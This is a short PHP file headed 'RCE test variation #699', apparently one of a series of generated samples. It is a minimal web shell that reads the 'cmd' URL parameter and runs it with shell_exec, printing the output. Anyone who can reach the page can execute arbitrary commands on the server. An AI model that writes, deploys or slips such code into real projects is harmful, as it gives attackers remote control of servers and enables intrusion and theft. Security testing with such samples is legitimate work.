<?php
// RCE test variation #699
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>